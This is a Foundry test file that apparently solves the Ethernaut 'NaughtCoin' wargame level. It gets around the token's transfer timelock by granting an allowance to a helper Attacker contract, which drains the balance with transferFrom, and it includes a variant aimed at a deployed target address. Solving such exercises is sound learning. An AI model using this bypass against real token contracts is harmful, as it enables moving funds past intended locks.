// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../../src/15_NaughtCoin.sol";

contract ContractTest is Test {

    NaughtCoin coin;

    function setUp() public {
        coin = new NaughtCoin(address(this));
    }

    function testAttack() public {
        _attack();
    }

    function _attack() internal {
        Attacker attacker = new Attacker(coin);
        coin.increaseAllowance(address(attacker), coin.balanceOf(address(this)));
        attacker.attack();
        assert(coin.balanceOf(address(this)) == 0);
    }
}

contract Attacker {
    
    NaughtCoin immutable coin;
    
    constructor(NaughtCoin _coin) {
        coin = _coin;
    }

    function attack() external {
        coin.transferFrom(msg.sender, address(this), coin.balanceOf(address(msg.sender)));
    }
}

contract ContractTestnet is ContractTest {
    function attack(address target) external {
        coin = NaughtCoin(target);
        _attack();
    }
}